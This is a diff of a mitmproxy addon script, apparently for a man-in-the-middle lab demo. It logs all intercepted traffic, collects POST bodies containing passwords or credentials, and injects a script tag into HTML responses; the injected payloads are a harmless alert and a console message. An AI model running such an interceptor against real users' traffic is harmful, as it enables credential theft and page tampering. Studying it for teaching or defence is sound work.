@@ -1,91 +1,73 @@
 import json
 import os
-from datetime import datetime
-
 from mitmproxy import http, ctx
+from datetime import datetime
 
 # Konfiguracja
 LOG_DIR = "/app/logs"
 os.makedirs(LOG_DIR, exist_ok=True)
 
-
 class Interceptor:
-    def __init__(self) -> None:
+    def __init__(self):
         self.request_count = 0
         self.captured_credentials = []
-
+        
     def request(self, flow: http.HTTPFlow) -> None:
         self.request_count += 1
-
+        
+        # Logging żądania
         log_entry = {
             "timestamp": datetime.now().isoformat(),
             "method": flow.request.method,
             "url": flow.request.pretty_url,
             "headers": dict(flow.request.headers),
-            "client_ip": flow.client_conn.address[0] if flow.client_conn and flow.client_conn.address else None,
+            "client_ip": flow.client_conn.address[0],
         }
-
-        # Przechwytywanie danych logowania w POST
+        
+        # Captura danych logowania
         if flow.request.method == "POST":
             try:
                 content = flow.request.get_text()
                 log_entry["body"] = content
-
+                
+                # Szukanie danych logowania
                 if "password" in content.lower() or "credentials" in content.lower():
                     self.captured_credentials.append(log_entry)
-                    ctx.log.warn(f"[!] Potential credentials: {content[:100]}")
+                    ctx.log.warn(f"[!] Potencjalne dane logowania: {content[:100]}")
             except Exception as e:
                 ctx.log.info(f"Error reading request body: {e}")
-
-        # Zapis logu żądania
+                pass
+        
+        # Zapisanie logu
         with open(f"{LOG_DIR}/requests.log", "a") as f:
             f.write(json.dumps(log_entry) + "\n")
-
+        
         ctx.log.info(f"Request #{self.request_count}: {flow.request.pretty_url}")
-
+    
     def response(self, flow: http.HTTPFlow) -> None:
-        # Modyfikacja HTML + logowanie odpowiedzi
-        try:
+        # Modyfikacja odpowiedzi
+        if "example.com" in flow.request.host:
             if flow.response.status_code == 200:
-                content_type = flow.response.headers.get("content-type", "")
-                if "text/html" in content_type and flow.response.content:
+                if "text/html" in flow.response.headers.get("content-type", ""):
+                    # Injection JavaScriptu
                     injection = """
 <script>
-alert("MITM: Twoje połączenie jest podsłuchiwane!");
+console.log("This page has been modified by MitM");
+// Malicious code could be injected here
 </script>
-"""
-
-                    # Pobierz HTML jako tekst
-                    html = flow.response.get_text()
-
-                    # Wstrzyknij tuż ZA <body>
-                    if "<body>" in html:
-                        html = html.replace("<body>", "<body>" + injection, 1)
-                    else:
-                        # awaryjnie: dołóż na początek
-                        html = injection + html
-
-                    # Zapisz zmodyfikowaną odpowiedź
-                    flow.response.set_text(html)
-                    ctx.log.warn("[!] HTML content modified (alert injected)")
-        except Exception as e:
-            ctx.log.info(f"Error modifying response: {e}")
-
+""".encode("utf-8")
+                    flow.response.content = injection + flow.response.content
+                    ctx.log.warn("[!] MITM! Content was modified")
+        
         # Logowanie odpowiedzi
-        try:
-            response_size = len(flow.response.content) if flow.response.content else 0
-        except Exception:
-            response_size = 0
-
         log_entry = {
             "timestamp": datetime.now().isoformat(),
             "url": flow.request.pretty_url,
             "status": flow.response.status_code,
-            "response_size": response_size,
+            "response_size": len(flow.response.content) if flow.response.content else 0,
         }
-
+        
         with open(f"{LOG_DIR}/responses.log", "a") as f:
             f.write(json.dumps(log_entry) + "\n")
-
 
 addons = [Interceptor()]
